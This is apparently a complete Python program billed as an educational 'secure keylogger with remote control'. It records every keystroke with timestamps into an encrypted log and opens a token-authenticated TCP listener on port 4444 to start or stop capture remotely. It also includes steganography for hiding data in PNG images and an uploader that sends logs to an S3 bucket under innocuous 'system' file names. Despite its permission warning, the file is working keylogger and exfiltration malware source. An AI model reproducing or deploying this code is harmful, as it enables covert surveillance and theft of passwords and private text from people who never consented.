import os
import sys
import time
import threading
import logging
import random
import struct
import getpass
import hashlib
import socket
from datetime import datetime
from typing import Optional, Tuple

# Third-party imports
try:
    import keyboard
except ImportError:
    print("Missing 'keyboard' library. Install with: pip install keyboard")
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
except ImportError:
    print("Missing 'cryptography' library. Install with: pip install cryptography")
    sys.exit(1)

try:
    from PIL import Image
except ImportError:
    print("Missing 'Pillow' library. Install with: pip install Pillow")
    sys.exit(1)

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    print("Missing 'boto3' library. Install with: pip install boto3")
    sys.exit(1)


# =============== CONFIGURATION ===============

LOG_FILE = "system_log.enc"
KEY_FILE = "secure.key"
BUFFER_FLUSH_INTERVAL = 30

REMOTE_HOST = "0.0.0.0"
REMOTE_PORT = 4444
AUTH_TOKEN = "MySecretToken123"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    handlers=[logging.FileHandler("system_monitor.log")],
)


class SecureEncryption:
    """Handle password-based AES-256-GCM encryption and key derivation."""

    def __init__(self, password: Optional[str] = None):
        self.password = password
        self.key = None
        self.salt = None

    def _derive_key(self, password: str, salt: bytes) -> bytes:
        """Derive a 256-bit key from the provided password and salt."""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend(),
        )
        return kdf.derive(password.encode())

    def get_or_create_key(self, path: str = KEY_FILE) -> Tuple[bytes, bytes]:
        """Load an existing key file or create one if needed."""
        if os.path.exists(path):
            with open(path, "rb") as f:
                salt = f.read(16)
                key = f.read()

            if self.password:
                derived = self._derive_key(self.password, salt)
                if derived != key:
                    raise ValueError("Invalid password!")

            self.key = key
            self.salt = salt
            return key, salt

        if not self.password:
            raise ValueError("No password provided and no existing key file.")

        self.salt = os.urandom(16)
        self.key = self._derive_key(self.password, self.salt)
        with open(path, "wb") as f:
            f.write(self.salt + self.key)
        return self.key, self.salt

    def encrypt_file(self, input_path: str, output_path: Optional[str] = None) -> None:
        """Encrypt a file and write the result with IV+TAG prepended."""
        if not self.key:
            raise ValueError("Encryption not initialized.")

        with open(input_path, "rb") as f:
            plaintext = f.read()

        iv = os.urandom(12)
        cipher = Cipher(
            algorithms.AES(self.key), modes.GCM(iv), backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag

        out_path = output_path or input_path + ".enc"
        with open(out_path, "wb") as f:
            f.write(iv + tag + ciphertext)

    def decrypt_file(self, input_path: str, output_path: Optional[str] = None) -> bytes:
        """Decrypt a file encrypted by encrypt_file."""
        if not self.key:
            raise ValueError("Encryption not initialized.")

        with open(input_path, "rb") as f:
            iv = f.read(12)
            tag = f.read(16)
            ciphertext = f.read()

        cipher = Cipher(
            algorithms.AES(self.key), modes.GCM(iv, tag), backend=default_backend()
        )
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()

        if output_path:
            with open(output_path, "wb") as f:
                f.write(plaintext)

        return plaintext


class SecureKeylogger:
    """Buffer keystrokes, encrypt them, and flush regularly to disk."""

    def __init__(self, encryption: SecureEncryption, log_file: str = LOG_FILE):
        self.encryption = encryption
        self.log_file = log_file
        self.running = False
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.modifiers = set()
        self.flush_thread = None

    def _flush_buffer_once(self) -> None:
        """Flush the current buffer to the encrypted log file."""
        if not self.buffer:
            return

        with self.buffer_lock:
            existing = (
                self.encryption.decrypt_file(self.log_file)
                if os.path.exists(self.log_file)
                else b""
            )
            new_content = existing + "".join(self.buffer).encode()
            temp_path = self.log_file + ".tmp"
            with open(temp_path, "wb") as f:
                f.write(new_content)

            self.encryption.encrypt_file(temp_path, self.log_file)
            os.remove(temp_path)
            self.buffer.clear()

    def _flush_buffer(self) -> None:
        """Background thread loop that periodically persists buffered keystrokes."""
        while self.running:
            time.sleep(BUFFER_FLUSH_INTERVAL)
            self._flush_buffer_once()

    def _on_press(self, event) -> None:
        """Record a key press event in the buffer."""
        if not self.running:
            return

        if event.name in ["shift", "ctrl", "alt", "cmd"]:
            self.modifiers.add(event.name)
            return

        if event.name == "esc" and "ctrl" in self.modifiers:
            self.stop()
            return

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        char = event.char if hasattr(event, "char") and event.char else f"[{event.name}]"

        if self.modifiers:
            mod_str = "+".join(sorted(self.modifiers))
            char = f"<{mod_str}+{char}>"

        entry = f"[{ts}] {char}\n"
        with self.buffer_lock:
            self.buffer.append(entry)

        logging.debug("Logged: %s", entry.strip())

    def _on_release(self, event) -> None:
        """Remove modifier keys when released."""
        if event.name in ["shift", "ctrl", "alt", "cmd"]:
            self.modifiers.discard(event.name)

    def start(self) -> None:
        """Begin key capture and start flush thread."""
        if self.running:
            return

        print("[Keylogger] Starting...")
        self.running = True
        self.flush_thread = threading.Thread(target=self._flush_buffer, daemon=True)
        self.flush_thread.start()
        keyboard.on_press(self._on_press)
        keyboard.on_release(self._on_release)

    def stop(self) -> None:
        """Stop key capture and flush remaining buffered keys."""
        if not self.running:
            return

        print("[Keylogger] Stopping...")
        self.running = False
        if self.flush_thread and self.flush_thread.is_alive():
            self.flush_thread.join(timeout=5)

        self._flush_buffer_once()
        keyboard.unhook_all()
        print("[Keylogger] Stopped.")

    def is_running(self) -> bool:
        """Return whether the keylogger is currently active."""
        return self.running


class RemoteController:
    """TCP server for authenticated remote keylogger control commands."""

    def __init__(
        self,
        keylogger: SecureKeylogger,
        host: str = REMOTE_HOST,
        port: int = REMOTE_PORT,
        auth_token: str = AUTH_TOKEN,
    ):
        self.keylogger = keylogger
        self.host = host
        self.port = port
        self.auth_token = auth_token
        self.server_socket = None
        self.running = False
        self.thread = None

    def _handle_client(self, client_socket, address) -> None:
        """Process one remote client command."""
        try:
            payload = client_socket.recv(1024).decode().strip()
            if not payload:
                return

            parts = payload.split(" ", 1)
            if len(parts) != 2:
                client_socket.send(b"ERROR: Invalid format. Use: TOKEN COMMAND\n")
                return

            token, command = parts
            if token != self.auth_token:
                client_socket.send(b"ERROR: Authentication failed\n")
                return

            command = command.upper()
            if command == "START":
                if not self.keylogger.is_running():
                    self.keylogger.start()
                    response = "OK: Keylogger started\n"
                else:
                    response = "OK: Keylogger already running\n"
            elif command == "STOP":
                if self.keylogger.is_running():
                    self.keylogger.stop()
                    response = "OK: Keylogger stopped\n"
                else:
                    response = "OK: Keylogger already stopped\n"
            elif command == "STATUS":
                status = "running" if self.keylogger.is_running() else "stopped"
                response = f"STATUS: {status}\n"
            elif command == "SHUTDOWN":
                response = "OK: Shutting down program\n"
                client_socket.send(response.encode())
                self.stop()
                os._exit(0)
            else:
                response = f"ERROR: Unknown command '{command}'\n"

            client_socket.send(response.encode())
        except Exception as exc:
            logging.error("Remote handler error: %s", exc)
        finally:
            client_socket.close()

    def start(self) -> None:
        """Start listening for remote commands in a background thread."""
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
        except OSError as exc:
            logging.error("Remote server failed to bind: %s", exc)
            self.running = False
            raise

        print(f"[Remote] Listening on {self.host}:{self.port}")
        self.thread = threading.Thread(target=self._serve_forever, daemon=True)
        self.thread.start()

    def _serve_forever(self) -> None:
        """Accept and handle incoming remote connections."""
        while self.running:
            try:
                client, addr = self.server_socket.accept()
                logging.info("Remote connection from %s", addr)
                self._handle_client(client, addr)
            except Exception as exc:
                if self.running:
                    logging.error("Server accept error: %s", exc)

    def stop(self) -> None:
        """Stop the remote command server."""
        self.running = False
        if self.server_socket:
            self.server_socket.close()


class ImprovedSteganography:
    """Hide and extract bytes inside PNG image pixels using LSB embedding."""

    @staticmethod
    def _capacity_ok(img: Image.Image, data_len: int) -> bool:
        """Check whether an image can hold the requested data payload."""
        width, height = img.size
        bits_per_pixel = len(img.getpixel((0, 0))) * 8
        total_bits = width * height * bits_per_pixel
        needed_bits = (data_len + 4 + 16) * 8
        return needed_bits <= total_bits * 0.9

    @staticmethod
    def embed_data(image_path: str, data: bytes, output_path: str) -> None:
        """Embed data into a PNG image and save the result."""
        img = Image.open(image_path)
        if img.mode not in ("RGB", "RGBA"):
            img = img.convert("RGBA")

        checksum = hashlib.sha256(data).digest()[:16]
        full_data = struct.pack("=L", len(data)) + data + checksum

        if not ImprovedSteganography._capacity_ok(img, len(full_data)):
            raise ValueError("Data too large for this image!")

        pixels = list(img.getdata())
        random.seed(hashlib.sha256(data).digest())
        order = list(range(len(pixels)))
        random.shuffle(order)

        bits = [(byte >> b) & 1 for byte in full_data for b in range(8)]
        bit_idx = 0

        for pixel_idx in order:
            if bit_idx >= len(bits):
                break

            pixel = list(pixels[pixel_idx])
            for c in range(len(pixel)):
                if bit_idx >= len(bits):
                    break
                pixel[c] = (pixel[c] & ~1) | bits[bit_idx]
                bit_idx += 1
            pixels[pixel_idx] = tuple(pixel)

        img.putdata(pixels)
        img.save(output_path, "PNG")

    @staticmethod
    def extract_data(image_path: str) -> bytes:
        """Extract hidden data from a PNG image."""
        img = Image.open(image_path)
        if img.mode not in ("RGB", "RGBA"):
            img = img.convert("RGBA")

        bits = [channel & 1 for pixel in img.getdata() for channel in pixel]
        data_bytes = [
            sum((bits[i + j] << j) for j in range(8))
            for i in range(0, len(bits), 8)
            if i + 8 <= len(bits)
        ]

        try:
            data_len = struct.unpack("=L", bytes(data_bytes[:4]))[0]
            if data_len + 20 > len(data_bytes):
                raise ValueError("Incomplete data")

            extracted = bytes(data_bytes[4 : 4 + data_len])
            stored_checksum = bytes(data_bytes[4 + data_len : 4 + data_len + 16])

            if hashlib.sha256(extracted).digest()[:16] != stored_checksum:
                raise ValueError("Checksum mismatch")

            return extracted
        except Exception as exc:
            raise ValueError(f"Extraction failed: {exc}")


class CloudStorageHider:
    """Upload encrypted logs to AWS S3."""

    def __init__(self, bucket_name: str, region: str = "us-east-1"):
        self.bucket_name = bucket_name
        self.region = region
        self.s3 = boto3.client("s3", region_name=region)

    def upload_file(self, file_path: str, object_key: Optional[str] = None) -> bool:
        """Upload a local file to the configured S3 bucket."""
        if object_key is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            random_suffix = random.randint(1000, 9999)
            object_key = f"logs/system_{timestamp}_{random_suffix}.log"

        try:
            self.s3.upload_file(
                file_path,
                self.bucket_name,
                object_key,
                ExtraArgs={"ServerSideEncryption": "AES256"},
            )
            logging.info("Uploaded to s3://%s/%s", self.bucket_name, object_key)
            return True
        except ClientError as exc:
            logging.error("Upload failed: %s", exc)
            return False


def main() -> None:
    """Run the secure keylogger with a remote control listener."""
    print("\n" + "=" * 50)
    print("     SECURE KEYLOGGER WITH REMOTE CONTROL")
    print("         (Educational Demonstration)")
    print("=" * 50 + "\n")
    print("WARNING: Use only on systems you own or have explicit")
    print("permission to monitor. Unauthorized use is illegal.\n")

    password = getpass.getpass("Enter encryption password: ")
    confirm = getpass.getpass("Confirm password: ")
    if password != confirm:
        print("Passwords do not match.")
        return

    encryption = SecureEncryption(password)
    try:
        encryption.get_or_create_key(KEY_FILE)
    except ValueError as exc:
        print(f"Key error: {exc}")
        return

    keylogger = SecureKeylogger(encryption, LOG_FILE)
    remote = RemoteController(keylogger)

    try:
        remote.start()
    except OSError:
        print(f"Could not start remote server on {REMOTE_HOST}:{REMOTE_PORT}.")
        return

    print(f"\n[Remote Control] Listening on port {REMOTE_PORT}")
    print("Commands: START, STOP, STATUS, SHUTDOWN")
    print("Use netcat or telnet to send: 'MySecretToken123 COMMAND'")
    print("\nKeylogger is currently STOPPED. Send START command to begin logging.")
    print("You can also stop locally with Ctrl+Esc.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Main] Shutting down...")
        remote.stop()
        if keylogger.is_running():
            keylogger.stop()
        sys.exit(0)


if __name__ == "__main__":
    main()
